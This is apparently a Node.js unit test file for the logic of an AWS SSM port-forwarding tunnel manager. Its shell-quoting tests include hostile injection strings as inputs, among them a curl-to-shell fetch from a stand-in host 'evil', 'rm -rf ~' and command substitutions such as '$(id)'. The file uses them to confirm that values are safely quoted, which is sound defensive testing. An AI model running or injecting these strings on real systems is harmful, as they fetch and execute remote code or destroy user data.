const test = require('node:test')
const assert = require('node:assert')
const L = require('../renderer/logic.js')

test('preferredRegion: the region most saved tunnels use, else the AWS default us-east-1', () => {
  assert.equal(L.preferredRegion([]), 'us-east-1')
  assert.equal(L.preferredRegion(undefined), 'us-east-1')
  const t = (region) => ({ region })
  assert.equal(L.preferredRegion([t('eu-west-1'), t('us-west-2'), t('eu-west-1')]), 'eu-west-1')
  assert.equal(L.preferredRegion([t('us-west-2'), t('eu-west-1')]), 'us-west-2', 'a tie keeps the first one seen')
  assert.equal(L.preferredRegion([t(''), t(null)]), 'us-east-1')
})

const MIN = 60e3, HR = 36e5, DAY = 864e5
const T = (o = {}) => ({ name: 'a', env: 'other', state: 'idle', local: 1000, port: 5432, host: 'h', desc: '', target: 'i-0357e26df0d26b2ae', region: 'us-west-2', archived: false, ...o })

test('env mapping canonical <-> mock keys', () => {
  assert.equal(L.envToMock('production'), 'prod')
  assert.equal(L.envToMock('staging'), 'stg')
  assert.equal(L.envToMock('other'), 'other')
  assert.equal(L.envToCanon('prod'), 'production')
  assert.equal(L.envToCanon('stg'), 'staging')
  assert.equal(L.envToCanon('other'), 'other')
})

test('dur and ago use the injected now', () => {
  const now = 1e12
  assert.equal(L.dur(now - 20e3, now), 'just now')
  assert.equal(L.dur(now - 5 * MIN, now), '5m')
  assert.equal(L.dur(now - (3 * HR + 7 * MIN), now), '3h 07m')
  assert.equal(L.dur(now - 2 * DAY, now), '2d')
  assert.equal(L.ago(now - 5 * MIN, now), '5m ago')
  assert.equal(L.ago(now - 1000, now), 'just now')
})

test('kind maps ports to labels and icons', () => {
  assert.deepEqual(L.kind(T({ port: 5432 })), ['PostgreSQL', 'db'])
  assert.deepEqual(L.kind(T({ port: '3306' })), ['MySQL', 'db'])
  assert.deepEqual(L.kind(T({ port: 6379, host: 'x.cache.amazonaws.com' })), ['Redis', 'cache'])
  assert.deepEqual(L.kind(T({ port: 6379, host: 'glacier-Valkey-1.serverless' })), ['Valkey', 'cache'])
  assert.deepEqual(L.kind(T({ port: 443 })), ['HTTPS', 'lock'])
  assert.deepEqual(L.kind(T({ port: 9999 })), ['TCP', 'plug'])
})

test('cliFor and awsCmd', () => {
  assert.equal(L.cliFor(T({ port: 5432, local: 15002 })), 'psql -h localhost -p 15002')
  assert.equal(L.cliFor(T({ port: 3306, local: 3300 })), 'mysql -h 127.0.0.1 -P 3300')
  assert.equal(L.cliFor(T({ port: 6379, local: 6370 })), 'redis-cli -p 6370')
  assert.equal(L.cliFor(T({ port: 443, local: 1443 })), 'https://localhost:1443')
  assert.equal(L.cliFor(T({ port: 22, local: 2222 })), 'https://localhost:2222')
  assert.equal(L.awsCmd({ region: 'r', target: 'i-1', host: 'h', port: 5432, local: 15002 }),
    'aws ssm start-session --region r --target i-1 --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters host=h,portNumber=5432,localPortNumber=15002')
})

test('shq leaves safe values bare and single-quotes everything else', () => {
  assert.equal(L.shq('abc'), 'abc')
  assert.equal(L.shq(5432), '5432')
  assert.equal(L.shq('a.b_c:d/e=f@g%h+i-j'), 'a.b_c:d/e=f@g%h+i-j')
  assert.equal(L.shq(''), "''")
  assert.equal(L.shq('a b'), "'a b'")
  assert.equal(L.shq("it's"), "'it'\\''s'")
  assert.equal(L.shq('$HOME'), "'$HOME'")
  assert.equal(L.shq('a;b'), "'a;b'")
  assert.equal(L.shq('a|b'), "'a|b'")
  assert.equal(L.shq('`id`'), "'`id`'")
  assert.equal(L.shq('"x"'), `'"x"'`)
  assert.equal(L.shq('x;curl${IFS}evil|sh;#'), "'x;curl${IFS}evil|sh;#'")
})

test('awsCmd quotes hostile values so a POSIX shell sees one literal argument each', () => {
  const base = { region: 'us-west-2', target: 'i-0357e26df0d26b2ae', host: 'db.example.com', port: 5432, local: 15002 }
  const head = 'aws ssm start-session --region us-west-2 --target i-0357e26df0d26b2ae --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '
  assert.equal(L.awsCmd(base), head + 'host=db.example.com,portNumber=5432,localPortNumber=15002')
  assert.equal(L.awsCmd({ ...base, host: 'x;curl${IFS}evil|sh;#' }),
    head + "'host=x;curl${IFS}evil|sh;#,portNumber=5432,localPortNumber=15002'")
  assert.equal(L.awsCmd({ ...base, host: "a'b" }), head + "'host=a'\\''b,portNumber=5432,localPortNumber=15002'")
  assert.equal(L.awsCmd({ ...base, host: '`id` $(id)' }), head + "'host=`id` $(id),portNumber=5432,localPortNumber=15002'")
  assert.equal(L.awsCmd({ ...base, region: 'r; rm -rf ~' }), head.replace('--region us-west-2', "--region 'r; rm -rf ~'") + 'host=db.example.com,portNumber=5432,localPortNumber=15002')
  assert.equal(L.awsCmd({ ...base, target: 'i-1 && x' }), head.replace('--target i-0357e26df0d26b2ae', "--target 'i-1 && x'") + 'host=db.example.com,portNumber=5432,localPortNumber=15002')
  assert.equal(L.awsCmd({ ...base, port: '1;2', local: '$x' }), head + "'host=db.example.com,portNumber=1;2,localPortNumber=$x'")
})

test('cliFor quotes the interpolated local port', () => {
  assert.equal(L.cliFor(T({ port: 5432, local: '1;id' })), "psql -h localhost -p '1;id'")
  assert.equal(L.cliFor(T({ port: 3306, local: '$x' })), "mysql -h 127.0.0.1 -P '$x'")
  assert.equal(L.cliFor(T({ port: 6379, local: '1 2' })), "redis-cli -p '1 2'")
})

test('suggestPort follows the convention and skips taken ports', () => {
  assert.equal(L.suggestPort(5432, new Set()), 1430)
  assert.equal(L.suggestPort(5432, new Set([1430, 1431])), 1432)
  assert.equal(L.suggestPort(3306, []), 3300)
  assert.equal(L.suggestPort(6379, [6370]), 6371)
  assert.equal(L.suggestPort(443, new Set()), 1443)
  assert.equal(L.suggestPort(8080, new Set()), 18080)
  assert.equal(L.suggestPort(55000, new Set()), 60000)
  assert.equal(L.suggestPort('5432', new Set([1430])), 1431)
})

test('live, busy, failing predicates', () => {
  for (const [s, l, b, f] of [['idle', 0, 0, 0], ['connecting', 1, 1, 0], ['active', 1, 1, 0], ['reconnecting', 0, 1, 1], ['failed', 0, 0, 1]]) {
    assert.equal(L.live({ state: s }), !!l, s)
    assert.equal(L.busy({ state: s }), !!b, s)
    assert.equal(L.failing({ state: s }), !!f, s)
  }
})

test('waiting tunnels show under Needs Attention but are not failing', () => {
  const ts = [T({ name: 'w', state: 'waiting' }), T({ name: 'ok', state: 'active' })]
  assert.deepEqual(L.visible(ts, 'attn', '').map(t => t.name), ['w'])
  assert.equal(L.needsAttention({ state: 'waiting' }), true)
  assert.equal(L.needsAttention({ state: 'active' }), false)
  assert.equal(L.allFailing([T({ state: 'waiting' }), T({ state: 'waiting' })]), false)
})

test('visible filters by view, archived and query', () => {
  const ts = [
    T({ name: 'p1', env: 'prod', state: 'active', target: 'i-aaaaaaaa', local: 15002 }),
    T({ name: 's1', env: 'stg', state: 'failed', target: 'i-bbbbbbbb', desc: 'Staging cache', port: 6379 }),
    T({ name: 'o1', env: 'other', state: 'reconnecting', target: 'i-aaaaaaaa' }),
    T({ name: 'x1', env: 'prod', archived: true }),
  ]
  const names = (v, q = '') => L.visible(ts, v, q).map(t => t.name)
  assert.deepEqual(names('all'), ['p1', 's1', 'o1'])
  assert.deepEqual(names('active'), ['p1'])
  assert.deepEqual(names('attn'), ['s1', 'o1'])
  assert.deepEqual(names('prod'), ['p1'])
  assert.deepEqual(names('stg'), ['s1'])
  assert.deepEqual(names('other'), ['o1'])
  assert.deepEqual(names('i-aaaaaaaa'), ['p1', 'o1'])
  assert.deepEqual(names('all', ' CACHE '), ['s1'])
  assert.deepEqual(names('all', '15002'), ['p1'])
  assert.deepEqual(names('all', 'redis'), ['s1'])
  assert.deepEqual(names('all', 'staging'), ['s1'])
})

test('plan sends idle tunnels to go unless the local port is held', () => {
  const a = T({ name: 'a', local: 1 }), b = T({ name: 'b', local: 2 }), c = T({ name: 'c', local: 1 }), d = T({ name: 'd', local: 3 })
  const held = new Map([[2, 'Terminal session (PID 9)']])
  const p = L.plan([a, b, c, d], held)
  assert.deepEqual(p.go.map(t => t.name), ['a', 'd'])
  assert.deepEqual(p.skip.map(([t, h]) => [t.name, h]), [['b', 'Terminal session (PID 9)'], ['c', 'a']])
  assert.equal(held.size, 1, 'input map is not mutated')
})

test('failingDays floors failingMs to days', () => {
  assert.equal(L.failingDays({ failingMs: 0 }), 0)
  assert.equal(L.failingDays({ failingMs: DAY - 1 }), 0)
  assert.equal(L.failingDays({ failingMs: 5 * DAY + 3 * HR }), 5)
  assert.equal(L.failingDays({}), 0)
})

test('purgeDaysLeft rounds up, floors at 0, null when disabled', () => {
  const now = 10 * DAY
  assert.equal(L.purgeDaysLeft({ archivedAt: now - DAY }, 7, now), 6)
  assert.equal(L.purgeDaysLeft({ archivedAt: now - HR }, 7, now), 7)
  assert.equal(L.purgeDaysLeft({ archivedAt: now - 6.5 * DAY }, 7, now), 1)
  assert.equal(L.purgeDaysLeft({ archivedAt: now - 8 * DAY }, 7, now), 0)
  assert.equal(L.purgeDaysLeft({ archivedAt: now - DAY }, 0, now), null)
  assert.equal(L.purgeDaysLeft({ archivedAt: null }, 7, now), 7)
})

test('errorKind classifies errors', () => {
  assert.equal(L.errorKind('Port 443 address already in use'), 'port')
  assert.equal(L.errorKind('bind: Already In Use'), 'port')
  assert.equal(L.errorKind('An error occurred (ExpiredTokenException) when'), 'token')
  assert.equal(L.errorKind('The security token is expired'), 'token')
  assert.equal(L.errorKind('Connection to destination port failed'), 'other')
  assert.equal(L.errorKind(null), 'other')
})

test('stripGaveUp removes the leading prefix only', () => {
  assert.equal(L.stripGaveUp('Gave up after 5 attempts: boom'), 'boom')
  assert.equal(L.stripGaveUp('boom'), 'boom')
  assert.equal(L.stripGaveUp(null), '')
})

test('allFailing needs 2+ non-archived tunnels in use, all failing', () => {
  const f = n => T({ name: n, state: 'failed' }), r = n => T({ name: n, state: 'reconnecting' })
  assert.equal(L.allFailing([f('a'), r('b')]), true)
  assert.equal(L.allFailing([f('a')]), false)
  assert.equal(L.allFailing([f('a'), T({ name: 'b', state: 'active' })]), false)
  assert.equal(L.allFailing([f('a'), r('b'), T({ name: 'c' })]), true, 'idle tunnels are ignored')
  assert.equal(L.allFailing([f('a'), T({ name: 'b', state: 'failed', archived: true })]), false)
  assert.equal(L.allFailing([]), false)
})

test('stableActive needs state active for at least 10 s', () => {
  const now = 1e12
  assert.equal(L.stableActive({ state: 'active', since: now - 10000 }, now), true)
  assert.equal(L.stableActive({ state: 'active', since: now - 9999 }, now), false)
  assert.equal(L.stableActive({ state: 'active', since: null }, now), false)
  assert.equal(L.stableActive({ state: 'reconnecting', since: now - 60000 }, now), false)
})
